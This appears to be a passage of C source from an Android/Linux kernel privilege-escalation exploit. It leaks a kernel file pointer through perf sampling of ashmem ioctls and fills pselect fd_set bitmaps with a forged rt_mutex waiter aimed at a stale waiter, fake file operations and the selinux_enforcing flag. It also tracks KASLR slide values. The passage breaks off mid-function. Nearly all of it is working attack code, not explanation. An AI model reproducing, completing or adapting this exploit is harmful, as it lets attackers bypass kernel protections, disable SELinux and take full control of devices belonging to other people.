#include "common.h"

#include <netinet/in.h>

#ifndef PSELECT_CFI_ROUTE_ATTEMPTS
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define PSELECT_CFI_ROUTE_ATTEMPTS 4
#else
#define PSELECT_CFI_ROUTE_ATTEMPTS 1
#endif
#endif
#ifndef PSELECT_STALE_WAITER_PRIO_ORACLE
#define PSELECT_STALE_WAITER_PRIO_ORACLE 0x78UL
#endif
#ifndef PSELECT_OOBINLINE
#define PSELECT_OOBINLINE 1
#endif
#ifndef PSELECT_BLOCK_READ_FDSET
#define PSELECT_BLOCK_READ_FDSET 0
#endif
#ifndef PSELECT_BLOCK_WRITE_FDSET
#define PSELECT_BLOCK_WRITE_FDSET 0
#endif
#ifndef PSELECT_BLOCK_WRITE_WORD2
#define PSELECT_BLOCK_WRITE_WORD2 0
#endif
#ifndef PSELECT_INERT_EXCEPT_FDSET
#define PSELECT_INERT_EXCEPT_FDSET 0
#endif
#ifndef PSELECT_DIAG_WAKE_FD
#define PSELECT_DIAG_WAKE_FD 0
#endif
#ifndef PSELECT_TCP_TRANSITION_ALL
#define PSELECT_TCP_TRANSITION_ALL 0
#endif
#ifndef PSELECT_TCP_OOB_LEAF_DIAG
#define PSELECT_TCP_OOB_LEAF_DIAG 0
#endif
#ifndef PSELECT_FAKE_WAITER_PI_PARENT_COLOR
#define PSELECT_FAKE_WAITER_PI_PARENT_COLOR 0
#endif
#ifndef PSELECT_NULL_WRITE_FDSET
#define PSELECT_NULL_WRITE_FDSET 0
#endif
#ifndef PSELECT_EX_CROSS_PAGE_FAULT
#define PSELECT_EX_CROSS_PAGE_FAULT 0
#endif
#ifndef PSELECT_ACCEPT_PARENT_COLOR_DIRTY
#define PSELECT_ACCEPT_PARENT_COLOR_DIRTY 0
#endif
#ifndef PSELECT_ACCEPT_LEGACY_EX_WORD2_ORACLE
#define PSELECT_ACCEPT_LEGACY_EX_WORD2_ORACLE 0
#endif
#ifndef PSELECT_REFRESH_PAGE_EACH_ROUTE
#define PSELECT_REFRESH_PAGE_EACH_ROUTE 0
#endif
#ifndef PSELECT_M53_WRITE_ONLY_CFI
#define PSELECT_M53_WRITE_ONLY_CFI 0
#endif
#ifndef PSELECT_ABORT_ON_UNSAFE_PARTIAL
#define PSELECT_ABORT_ON_UNSAFE_PARTIAL 0
#endif
#ifndef PSELECT_EXIT_ON_UNSAFE_PARTIAL
#define PSELECT_EXIT_ON_UNSAFE_PARTIAL 0
#endif
#ifndef REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE
#define REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE 0
#endif
#if REQUIRE_RUNTIME_CONTROL_FOPS_RESTORE && \
    (!defined(REPAIR_FAKE_FOPS_OWNER_BEFORE_CFI) || \
     !REPAIR_FAKE_FOPS_OWNER_BEFORE_CFI)
#error runtime f_ops restore requires the exact-positive owner repair gate
#endif


atomic_int cfi_stage_done;
ssize_t cfi_write_ret = -1;
ssize_t cfi_read_ret = -1;
ssize_t cfi_read_slot_ret = -1;
ssize_t cfi_owner_ret = -1;
ssize_t cfi_restore_ret = -1;
uint64_t fops_before;
uint64_t fops_after;
int cfi_attempts;
int pipe_stage_attempts;
int cfi_dirty_seen;
int cfi_last_step;
int cfi_last_errno;
int kaslr_done;
uint64_t kaslr_base;
uint64_t kaslr_slide;
uint64_t slide_bootid_before;
uint64_t slide_bootid_after;
uint64_t slide_bootid_want;
ssize_t slide_bootid_restore_ret = -1;
uintptr_t pselect_observed_task;

static int cfi_preopen_fd = -1;
__attribute__((visibility("hidden"))) int cfi_rw_keeper_fd = -1;
static int env_flag_enabled(const char *name);
static int make_ready_tcp_fd(int *ready_fd, int *peer_fd);
static fd_set pselect_read_shape;
static fd_set pselect_write_shape;
static fd_set pselect_except_shape;

static void file_target_ring_copy(void *dst, const unsigned char *ring,
                                  size_t ring_size, uint64_t pos,
                                  size_t len) {
  size_t off = (size_t)(pos % ring_size);
  size_t first = ring_size - off;
  if (first > len) first = len;
  memcpy(dst, ring + off, first);
  if (first < len) memcpy((unsigned char *)dst + first, ring, len - first);
}

struct file_target_measurement {
  uintptr_t file;
  uintptr_t body;
  int ioctl_ok;
  int samples;
  int votes;
};

static int measure_preopened_ashmem_file(int ashmem_fd,
                                        struct file_target_measurement *out) {
#if defined(ASHMEM_IOCTL_BODY_OFF) && defined(FILE_F_OP_OFF)
  struct perf_event_attr attr = {0};
  attr.type = PERF_TYPE_HARDWARE;
  attr.size = sizeof(attr);
  attr.config = PERF_COUNT_HW_CPU_CYCLES;
  attr.disabled = 1;
  attr.exclude_user = 1;
  attr.exclude_hv = 1;
  attr.sample_period = 20000;
  attr.sample_type = PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
  attr.sample_regs_intr = (1ULL << 33) - 1;
  attr.wakeup_events = 1;
  int perf_fd = (int)syscall(__NR_perf_event_open, &attr, 0, -1, -1, 0);
  if (perf_fd < 0) {
    pr_error("file-target perf open failed errno=%d\n", errno);
    return 0;
  }
  size_t page_size = (size_t)sysconf(_SC_PAGESIZE);
  size_t ring_size = page_size * 16;
  size_t map_size = page_size + ring_size;
  unsigned char *mapping = mmap(NULL, map_size, PROT_READ | PROT_WRITE,
                                MAP_SHARED, perf_fd, 0);
  if (mapping == MAP_FAILED) {
    pr_error("file-target perf mmap failed errno=%d\n", errno);
    close(perf_fd);
    return 0;
  }
  struct perf_event_mmap_page *meta = (void *)mapping;
  ioctl(perf_fd, PERF_EVENT_IOC_RESET, 0);
  ioctl(perf_fd, PERF_EVENT_IOC_ENABLE, 0);
  int ioctl_ok = 0;
  const int ioctl_iterations = 100000;
  for (int i = 0; i < ioctl_iterations; i++) {
    if (ioctl(ashmem_fd, ASHMEM_GET_SIZE, 0) == 0) ioctl_ok++;
  }
  ioctl(perf_fd, PERF_EVENT_IOC_DISABLE, 0);

  struct file_vote { uintptr_t ptr; int count; } votes[16] = {{0}};
  int vote_count = 0;
  int samples = 0;
  uint64_t head = __atomic_load_n(&meta->data_head, __ATOMIC_ACQUIRE);
  uint64_t tail = meta->data_tail;
  if (head - tail > ring_size) tail = head - ring_size;
  uintptr_t body = text_addr(KIMAGE_TEXT_BASE + ASHMEM_IOCTL_BODY_OFF);
  while (tail < head) {
    struct perf_event_header hdr;
    file_target_ring_copy(&hdr, mapping + page_size, ring_size, tail,
                          sizeof(hdr));
    if (hdr.size < sizeof(hdr) || hdr.size > 1024) {
      tail++;
      continue;
    }
    unsigned char sample[1024];
    file_target_ring_copy(sample, mapping + page_size, ring_size, tail,
                          hdr.size);
    if (hdr.type == PERF_RECORD_SAMPLE &&
        hdr.size >= sizeof(hdr) + 8 + 34 * sizeof(uint64_t)) {
      uint64_t *regs = (void *)(sample + sizeof(hdr) + 8);
      uintptr_t x0 = (uintptr_t)regs[1];
      uintptr_t pc = (uintptr_t)regs[33];
      if (regs[0] == PERF_SAMPLE_REGS_ABI_64 &&
          pc >= body && pc < body + 0x990 && is_direct_ptr(x0) &&
          !(x0 & 7)) {
        samples++;
        int found = -1;
        for (int i = 0; i < vote_count; i++) {
          if (votes[i].ptr == x0) { found = i; break; }
        }
        if (found < 0 && vote_count < 16) {
          found = vote_count++;
          votes[found].ptr = x0;
        }
        if (found >= 0) votes[found].count++;
      }
    }
    tail += hdr.size;
  }
  __atomic_store_n(&meta->data_tail, tail, __ATOMIC_RELEASE);
  int best = -1;
  for (int i = 0; i < vote_count; i++) {
    if (best < 0 || votes[i].count > votes[best].count) best = i;
  }
  uintptr_t file = best >= 0 ? votes[best].ptr : 0;
  int best_votes = best >= 0 ? votes[best].count : 0;
  out->file = file;
  out->body = body;
  out->ioctl_ok = ioctl_ok;
  out->samples = samples;
  out->votes = best_votes;
  munmap(mapping, map_size);
  close(perf_fd);
  return ioctl_ok == ioctl_iterations && best_votes >= 2 &&
         is_direct_ptr(file + FILE_F_OP_OFF);
#else
  pr_error("file-target build lacks ASHMEM_IOCTL_BODY_OFF/FILE_F_OP_OFF\n");
  return 0;
#endif
}

int prepare_preopened_ashmem_file_target(void) {
#if defined(ASHMEM_IOCTL_BODY_OFF) && defined(FILE_F_OP_OFF)
  if (cfi_preopen_fd >= 0) close(cfi_preopen_fd);
  cfi_preopen_fd = open_ashmem_device();
  if (cfi_preopen_fd < 0) {
    pr_error("file-target ashmem open failed errno=%d\n", errno);
    return 0;
  }

  int result_pipe[2];
  if (pipe2(result_pipe, O_CLOEXEC) != 0) {
    pr_error("file-target result pipe failed errno=%d\n", errno);
    return 0;
  }
  pid_t child = fork();
  if (child < 0) {
    pr_error("file-target sampler fork failed errno=%d\n", errno);
    close(result_pipe[0]);
    close(result_pipe[1]);
    return 0;
  }
  if (child == 0) {
    close(result_pipe[0]);
    struct file_target_measurement result = {0};
    int ok = measure_preopened_ashmem_file(cfi_preopen_fd, &result);
    ssize_t written = write(result_pipe[1], &result, sizeof(result));
    close(result_pipe[1]);
    _exit(ok && written == (ssize_t)sizeof(result) ? 0 : 1);
  }

  close(result_pipe[1]);
  struct file_target_measurement result = {0};
  size_t received = 0;
  while (received < sizeof(result)) {
    ssize_t n = read(result_pipe[0], (unsigned char *)&result + received,
                     sizeof(result) - received);
    if (n > 0) received += (size_t)n;
    else if (n < 0 && errno == EINTR) continue;
    else break;
  }
  close(result_pipe[0]);
  int status = 0;
  while (waitpid(child, &status, 0) < 0 && errno == EINTR) {}
  int valid = received == sizeof(result) && WIFEXITED(status) &&
              WEXITSTATUS(status) == 0;
  runtime_file_fops_target = valid ? result.file + FILE_F_OP_OFF : 0;
  pr_info("file-target child=%d ioctl_ok=%d samples=%d body=%016zx "
          "file=%016zx votes=%d f_op=%016zx valid=%d\n",
          child, result.ioctl_ok, result.samples, result.body, result.file,
          result.votes, runtime_file_fops_target, valid);
  if (!valid) return 0;

  int high_fd = fcntl(cfi_preopen_fd, F_DUPFD_CLOEXEC,
                      PSELECT_ROUTE_NFDS + 128);
  if (high_fd < 0) {
    pr_error("file-target high-fd duplicate failed errno=%d\n", errno);
    return 0;
  }
  close(cfi_preopen_fd);
  cfi_preopen_fd = high_fd;
  pr_info("file-target retained high fd=%d target=%016zx\n",
          cfi_preopen_fd, runtime_file_fops_target);
  return 1;
#else
  pr_error("file-target build lacks ASHMEM_IOCTL_BODY_OFF/FILE_F_OP_OFF\n");
  return 0;
#endif
}

int pselect_remap_write_fds(void) {
  int read_pair[2] = {-1, -1};
  int write_pair[2] = {-1, -1};
  int high_read = -1;
  int high_read_peer = -1;
  int high_write = -1;
  int high_write_peer = -1;
  int high_except = -1;
  int high_except_peer = -1;
  int remapped = 0;

  if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, read_pair) != 0 ||
      socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, write_pair) != 0 ||
      !make_ready_tcp_fd(&high_except, &high_except_peer))
    goto fail;

  high_read = fcntl(read_pair[0], F_DUPFD_CLOEXEC,
                    PSELECT_ROUTE_NFDS + 70);
  high_read_peer = fcntl(read_pair[1], F_DUPFD_CLOEXEC,
                         PSELECT_ROUTE_NFDS + 71);
  high_write = fcntl(write_pair[0], F_DUPFD_CLOEXEC,
                     PSELECT_ROUTE_NFDS + 72);
  high_write_peer = fcntl(write_pair[1], F_DUPFD_CLOEXEC,
                          PSELECT_ROUTE_NFDS + 73);
  close(read_pair[0]); read_pair[0] = -1;
  close(read_pair[1]); read_pair[1] = -1;
  close(write_pair[0]); write_pair[0] = -1;
  close(write_pair[1]); write_pair[1] = -1;
  if (high_read < 0 || high_read_peer < 0 || high_write < 0 ||
      high_write_peer < 0)
    goto fail;

  /* Establish every readiness condition before replacing the descriptors.
   * dup2() does not notify the wait queues on which pselect is sleeping, so
   * the original TCP OOB remains the only wakeup.  Its rescan then sees the
   * same three bitmaps that were copied in, preventing copyout from changing
   * the stale waiter while rt_mutex_adjust_prio_chain() uses it. */
  if (send(high_read_peer, "R", 1, MSG_DONTWAIT) != 1 ||
      send(high_except_peer, "!", 1, MSG_OOB) != 1)
    goto fail;

  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    int replacement = -1;
    if (FD_ISSET(fd, &pselect_read_shape)) replacement = high_read;
    if (FD_ISSET(fd, &pselect_write_shape)) {
      if (replacement >= 0) goto fail;
      replacement = high_write;
    }
    if (FD_ISSET(fd, &pselect_except_shape)) {
      if (replacement >= 0) goto fail;
      replacement = high_except;
    }
    if (replacement >= 0) {
      if (dup2(replacement, fd) < 0) goto fail;
      remapped++;
    }
  }
  close(high_read);
  close(high_read_peer);
  close(high_write);
  close(high_write_peer);
  close(high_except);
  close(high_except_peer);
  return remapped;

fail:
  if (read_pair[0] >= 0) close(read_pair[0]);
  if (read_pair[1] >= 0) close(read_pair[1]);
  if (write_pair[0] >= 0) close(write_pair[0]);
  if (write_pair[1] >= 0) close(write_pair[1]);
  if (high_read >= 0) close(high_read);
  if (high_read_peer >= 0) close(high_read_peer);
  if (high_write >= 0) close(high_write);
  if (high_write_peer >= 0) close(high_write_peer);
  if (high_except >= 0) close(high_except);
  if (high_except_peer >= 0) close(high_except_peer);
  return -1;
}

static int route_delay_usec(int attempt) {
  const char *forced = getenv("PSELECT_DELAY_USEC");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
      if (env_flag_enabled("PSELECT_ROUTE_FIXED_DELAY_RUNTIME") ||
          env_flag_enabled("PSELECT_SUPERVISOR_FIXED_DELAY_RUNTIME")) {
        return (int)value;
      }
      const char *runtime_offsets =
          getenv("PSELECT_ROUTE_DELAY_OFFSETS_RUNTIME");
      if (runtime_offsets && *runtime_offsets) {
        int offsets[32];
        int count = 0;
        const char *p = runtime_offsets;
        while (*p && count < (int)(sizeof(offsets) / sizeof(offsets[0]))) {
          while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' ||
                 *p == ':') {
            p++;
          }
          if (!*p) {
            break;
          }
          char *next = NULL;
          errno = 0;
          long offset = strtol(p, &next, 0);
          if (next == p) {
            break;
          }
          if (!errno && offset >= -1000000 && offset <= 1000000) {
            offsets[count++] = (int)offset;
          }
          p = next;
        }
        if (count > 0) {
          long delayed = value + offsets[(attempt - 1) % count];
          return delayed < 0 ? 0 : (int)delayed;
        }
      }
#if defined(PSELECT_ROUTE_DELAY_OFFSETS_USEC)
      static const int offsets[] = {PSELECT_ROUTE_DELAY_OFFSETS_USEC};
      size_t index = (size_t)(attempt - 1) %
                     (sizeof(offsets) / sizeof(offsets[0]));
      long delayed = value + offsets[index];
      return delayed < 0 ? 0 : (int)delayed;
#elif defined(APP_PAYLOAD) && APP_PAYLOAD
      static const int offsets[] = {0, 5000, 0, 5000};
      size_t index = (size_t)(attempt - 1) %
                     (sizeof(offsets) / sizeof(offsets[0]));
      return (int)value + offsets[index];
#else
      return (int)value;
#endif
    }
  }
  static const int delays[] = {
    50000, 30000, 70000, 10000, 100000, 150000, 20000, 120000,
  };

  int count = (int)(sizeof(delays) / sizeof(delays[0]));
  return delays[(attempt - 1) % count];
}

static int route_attempt_limit_runtime(void) {
  int limit = PSELECT_CFI_ROUTE_ATTEMPTS;
  const char *forced = getenv("PSELECT_CFI_ROUTE_ATTEMPTS_RUNTIME");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 1 && value <= 16) {
      limit = (int)value;
    }
  }
  return limit;
}

static int pselect_write_only_cfi_enabled(void) {
#if defined(PSELECT_M53_WRITE_ONLY_CFI) && PSELECT_M53_WRITE_ONLY_CFI
  return 1;
#else
  return getenv("PSELECT_M53_WRITE_ONLY_CFI") != NULL;
#endif
}

static int env_flag_enabled(const char *name) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return 0;
  }
  return strcmp(value, "0") != 0 && strcmp(value, "false") != 0 &&
         strcmp(value, "FALSE") != 0 && strcmp(value, "no") != 0 &&
         strcmp(value, "NO") != 0;
}

static int env_flag_or_default(const char *name, int default_value) {
  const char *value = getenv(name);
  if (!value || !*value) {
    return default_value;
  }
  return strcmp(value, "0") != 0 && strcmp(value, "false") != 0 &&
         strcmp(value, "FALSE") != 0 && strcmp(value, "no") != 0 &&
         strcmp(value, "NO") != 0;
}

static int pselect_block_read_fdset_enabled(void) {
  return env_flag_or_default("PSELECT_BLOCK_READ_FDSET_RUNTIME",
                             PSELECT_BLOCK_READ_FDSET);
}

static void maybe_exit_after_oracle_skip(void) {
  if (!env_flag_enabled("PSELECT_CALIBRATE_ORACLE_EXIT_SUCCESS")) {
    return;
  }
  pr_info("pselect oracle calibration exit success by env\n");
  fflush(NULL);
  _exit(0);
}

static int route_word_shift_runtime(int attempt) {
  int shift = SLIDE_PSELECT_WORD_SHIFT;
  const char *forced = getenv("PSELECT_WORD_SHIFT_RUNTIME");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 16) {
      shift = (int)value;
    }
  }

  const char *runtime_offsets =
      getenv("PSELECT_ROUTE_WORD_SHIFT_OFFSETS_RUNTIME");
  if (runtime_offsets && *runtime_offsets) {
    int offsets[32];
    int count = 0;
    const char *p = runtime_offsets;
    while (*p && count < (int)(sizeof(offsets) / sizeof(offsets[0]))) {
      while (*p == ' ' || *p == '\t' || *p == ',' || *p == ';' ||
             *p == ':') {
        p++;
      }
      if (!*p) {
        break;
      }
      char *next = NULL;
      errno = 0;
      long offset = strtol(p, &next, 0);
      if (next == p) {
        break;
      }
      if (!errno && offset >= -16 && offset <= 16) {
        offsets[count++] = (int)offset;
      }
      p = next;
    }
    if (count > 0) {
      shift += offsets[(attempt - 1) % count];
    }
  }

  if (shift < 0) {
    shift = 0;
  }
  if (shift > 16) {
    shift = 16;
  }
  return shift;
}

static int accept_legacy_ex_word2_oracle(void) {
  int accept = PSELECT_ACCEPT_LEGACY_EX_WORD2_ORACLE;
  const char *forced = getenv("PSELECT_ACCEPT_LEGACY_EX_WORD2_ORACLE_RUNTIME");
  if (forced && *forced) {
    char *end = NULL;
    errno = 0;
    long value = strtol(forced, &end, 0);
    if (!errno && end != forced && !*end && value >= 0 && value <= 1) {
      accept = (int)value;
    }
  }
  return accept;
}

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

static void pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int global_word, uint64_t value) {
  const int words_per_set =
      (PSELECT_ROUTE_NFDS + (int)(8 * sizeof(unsigned long)) - 1) /
      (int)(8 * sizeof(unsigned long));
  int set = global_word / words_per_set;
  int word = global_word % words_per_set;
  if (set == 0) {
    fdset_put_word(in, word, value);
  } else if (set == 1) {
    fdset_put_word(out, word, value);
  } else if (set == 2) {
    fdset_put_word(ex, word, value);
  }
}

static int pselect_words_per_set(void) {
  return (PSELECT_ROUTE_NFDS + (int)(8 * sizeof(unsigned long)) - 1) /
         (int)(8 * sizeof(unsigned long));
}

static unsigned long pselect_get_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int global_word) {
  int words_per_set = pselect_words_per_set();
  int set = global_word / words_per_set;
  int word = global_word % words_per_set;
  if (set == 0) {
    return ((unsigned long *)in)[word];
  }
  if (set == 1) {
    return ((unsigned long *)out)[word];
  }
  if (set == 2) {
    return ((unsigned long *)ex)[word];
  }
  return 0;
}

static const char *pselect_waiter_word_name(int waiter_word) {
  switch (waiter_word) {
    case 0: return "tree_entry.__rb_parent_color";
    case 1: return "tree_entry.rb_right";
    case 2: return "tree_entry.rb_left";
    case 3: return "pi_tree_entry.__rb_parent_color";
    case 4: return "pi_tree_entry.rb_right";
    case 5: return "pi_tree_entry.rb_left";
    case 6: return "task";
    case 7: return "lock";
    case 8: return "prio";
    case 9: return "deadline";
    default: return "unknown";
  }
}

static void pselect_log_waiter_words(
    fd_set *in, fd_set *out, fd_set *ex, fd_set *expected_in,
    fd_set *expected_out, fd_set *expected_ex, int shift) {
  for (int word = 0; word < 10; word++) {
    unsigned long value =
        pselect_get_global_word(in, out, ex, shift + word);
    unsigned long expected =
        pselect_get_global_word(
            expected_in, expected_out, expected_ex, shift + word);
    if (value != expected) {
      pr_info("pselect waiter[%d] %s=%016lx/%016lx\n",
              word, pselect_waiter_word_name(word), value, expected);
    }
  }
}

static void open_selected_fds_ex(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd,
    int except_fd, int block_write_word, int block_write_fd) {
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 31);
  int high_write = fcntl(write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  int high_except = fcntl(except_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 33);
  int high_block_write = -1;
  if (block_write_word >= 0 && block_write_fd >= 0) {
    high_block_write =
        fcntl(block_write_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 36);
  }
  if (high_read < 0 || high_write < 0 || high_except < 0 ||
      (block_write_word >= 0 && block_write_fd >= 0 && high_block_write < 0)) {
    pr_warning("pselect F_DUPFD selected errno=%d\n", errno);
    if (high_read >= 0) close(high_read);
    if (high_write >= 0) close(high_write);
    if (high_except >= 0) close(high_except);
    if (high_block_write >= 0) close(high_block_write);
    return;
  }
  const int word_bits = (int)(8 * sizeof(unsigned long));
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in)) {
      dup2(high_read, fd);
    }
    if (FD_ISSET(fd, out)) {
      int out_fd = high_write;
      if (fd / word_bits == block_write_word && high_block_write >= 0) {
        out_fd = high_block_write;
      }
      dup2(out_fd, fd);
    }
    if (FD_ISSET(fd, ex)) {
      dup2(high_except, fd);
    }
  }
  close(high_read);
  close(high_write);
  close(high_except);
  if (high_block_write >= 0) close(high_block_write);
}

void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd, int write_fd,
    int except_fd) {
  open_selected_fds_ex(in, out, ex, read_fd, write_fd, except_fd, -1, -1);
}

static int make_ready_tcp_fd(int *ready_fd, int *peer_fd) {
  int listener = -1;
  int client = -1;
  int accepted = -1;
  int high_client = -1;
  int high_accepted = -1;
  int one = 1;
  struct sockaddr_in addr = {
    .sin_family = AF_INET,
    .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
    .sin_port = 0,
  };
  socklen_t addr_len = sizeof(addr);

  listener = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (listener < 0 ||
      setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) != 0 ||
      bind(listener, (struct sockaddr *)&addr, sizeof(addr)) != 0 ||
      listen(listener, 1) != 0 ||
      getsockname(listener, (struct sockaddr *)&addr, &addr_len) != 0) {
    goto fail;
  }
  client = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (client < 0 ||
      connect(client, (struct sockaddr *)&addr, sizeof(addr)) != 0) {
    goto fail;
  }
  accepted = accept4(listener, NULL, NULL, SOCK_CLOEXEC);
  if (accepted < 0) {
    goto fail;
  }
#if PSELECT_TCP_TRANSITION_ALL
  {
    int small_buf = 4096;
    if (setsockopt(accepted, SOL_SOCKET, SO_SNDBUF,
                   &small_buf, sizeof(small_buf)) != 0 ||
        setsockopt(client, SOL_SOCKET, SO_RCVBUF,
                   &small_buf, sizeof(small_buf)) != 0) {
      goto fail;
    }
  }
#endif
#if PSELECT_OOBINLINE
  if (setsockopt(accepted, SOL_SOCKET, SO_OOBINLINE, &one, sizeof(one)) != 0) {
    goto fail;
  }
#endif
  high_client = fcntl(client, F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 64);
  high_accepted = fcntl(accepted, F_DUPFD_CLOEXEC, PSELECT_ROUTE_NFDS + 65);
  if (high_client < 0 || high_accepted < 0) {
    goto fail;
  }

  close(listener);
  close(client);
  close(accepted);
  *ready_fd = high_accepted;
  *peer_fd = high_client;
  return 1;

fail:
  if (listener >= 0) close(listener);
  if (client >= 0) close(client);
  if (accepted >= 0) close(accepted);
  if (high_client >= 0) close(high_client);
  if (high_accepted >= 0) close(high_accepted);
  return 0;
}

void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

#if LEGACY_RT_MUTEX_WAITER
  /*
   * The 4.19 waiter is ten qwords.  PSELECT_ROUTE_NFDS=320 gives five
   * qwords per fd_set, so the waiter spans `in` and `out`; the modern
   * 14-qword layout below would leave legacy waiter->lock as NULL.
   */
#if defined(PSELECT_ZERO_SELINUX_DIRECT) && PSELECT_ZERO_SELINUX_DIRECT
  const int shift = SLIDE_PSELECT_WORD_SHIFT;
  pselect_put_global_word(in, out, ex, shift + 0,
#if defined(PSELECT_STALE_TREE_SELF_TARGET_DIAG) && \
    PSELECT_STALE_TREE_SELF_TARGET_DIAG
                          fake_fops - FOPS_TABLE_OFF + SCRATCH_OFF - 8
#else
                          fake_w0
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 1,
#if defined(PSELECT_STALE_TREE_SELF_TARGET_DIAG) && \
    PSELECT_STALE_TREE_SELF_TARGET_DIAG
#if defined(PSELECT_STALE_TREE_REPLACEMENT_DIAG) && \
    PSELECT_STALE_TREE_REPLACEMENT_DIAG
                          fake_fops - FOPS_TABLE_OFF + RIGHT_OFF
#else
                          PSELECT_TCP_OOB_LEAF_DIAG
                              ? 0
                              : fake_fops - FOPS_TABLE_OFF + RIGHT_OFF
#endif
#else
                          0
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 2, 0);
  pselect_put_global_word(in, out, ex, shift + 3,
                          data_addr(SELINUX_ENFORCING) - 16);
  pselect_put_global_word(in, out, ex, shift + 4, 0);
  pselect_put_global_word(in, out, ex, shift + 5, 0);
  pselect_put_global_word(in, out, ex, shift + 6,
                          runtime_waiter_task ? runtime_waiter_task : text_addr(INIT_TASK));
  pselect_put_global_word(in, out, ex, shift + 7, fake_lock);
  pselect_put_global_word(in, out, ex, shift + 8,
#ifdef PSELECT_FAKE_WAITER_PRIO
                          PSELECT_FAKE_WAITER_PRIO
#else
                          FAKE_WAITER_PRIO
#endif
  );
#else
  const int shift = SLIDE_PSELECT_WORD_SHIFT;
  pselect_put_global_word(in, out, ex, shift + 0,
#if defined(PSELECT_STALE_TREE_SELF_TARGET_DIAG) && \
    PSELECT_STALE_TREE_SELF_TARGET_DIAG
                          fake_fops - FOPS_TABLE_OFF + SCRATCH_OFF - 8
#else
                          fake_w0
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 1,
#if defined(PSELECT_STALE_TREE_SELF_TARGET_DIAG) && \
    PSELECT_STALE_TREE_SELF_TARGET_DIAG
#if defined(PSELECT_STALE_TREE_REPLACEMENT_DIAG) && \
    PSELECT_STALE_TREE_REPLACEMENT_DIAG
                          fake_fops - FOPS_TABLE_OFF + RIGHT_OFF
#else
                          PSELECT_TCP_OOB_LEAF_DIAG
                              ? 0
                              : fake_fops - FOPS_TABLE_OFF + RIGHT_OFF
#endif
#else
                          0
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 2, 0);
  pselect_put_global_word(in, out, ex, shift + 3,
#if defined(PSELECT_FOPS_PI_TREE_WRITE) && PSELECT_FOPS_PI_TREE_WRITE
                          fake_fops
#else
                          PSELECT_FAKE_WAITER_PI_PARENT_COLOR
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 4,
#if defined(PSELECT_FOPS_PI_TREE_WRITE) && PSELECT_FOPS_PI_TREE_WRITE
                          data_addr(ASHMEM_MISC_FOPS)
#else
                          0
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 5, 0);
  pselect_put_global_word(in, out, ex, shift + 6,
                          runtime_waiter_task ? runtime_waiter_task : text_addr(INIT_TASK));
#if defined(PSELECT_NULL_LOCK_DIAG) && PSELECT_NULL_LOCK_DIAG
  pselect_put_global_word(in, out, ex, shift + 7, 0);
#else
  pselect_put_global_word(in, out, ex, shift + 7, fake_lock);
#endif
  pselect_put_global_word(in, out, ex, shift + 8,
#ifdef PSELECT_FAKE_WAITER_PRIO
                          PSELECT_FAKE_WAITER_PRIO
#else
                          FAKE_WAITER_PRIO
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 9, 0);
#endif
#else
  fdset_put_word(in, 0, fake_w0);
  fdset_put_word(in, 1, 0);
  fdset_put_word(in, 2, 0);
  fdset_put_word(in, 3, 0);
  fdset_put_word(ex, 0, text_addr(INIT_TASK));
  fdset_put_word(ex, 1, fake_lock);
  fdset_put_word(ex, 2, 3);
  fdset_put_word(ex, 3, 0);
#endif
}

static void __attribute__((unused)) prepare_pselect_fdsets_shift(
    fd_set *in, fd_set *out, fd_set *ex, int word_shift) {
  if (word_shift < 0) {
    word_shift = 0;
  }

  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

#if LEGACY_RT_MUTEX_WAITER
  const int shift = word_shift;
  pselect_put_global_word(in, out, ex, shift + 0,
#if defined(PSELECT_STALE_TREE_SELF_TARGET_DIAG) && \
    PSELECT_STALE_TREE_SELF_TARGET_DIAG
                          fake_fops - FOPS_TABLE_OFF + SCRATCH_OFF - 8
#else
                          fake_w0
#endif
  );
  pselect_put_global_word(in, out, ex, shift + 1,
#if defined(PSELECT_STALE_TREE_SELF_TARGET_DIAG) && \
    PSELECT_STALE_TREE_SELF_TARGET_DIAG
#if defined(PSELECT_STALE_TREE_REPLACEMENT_DIAG) && \
    PSELECT_STALE_TREE_REPLACEMENT_DIAG
                          fake_fops - FOPS_TABLE_OFF + RIGHT_OFF
#else
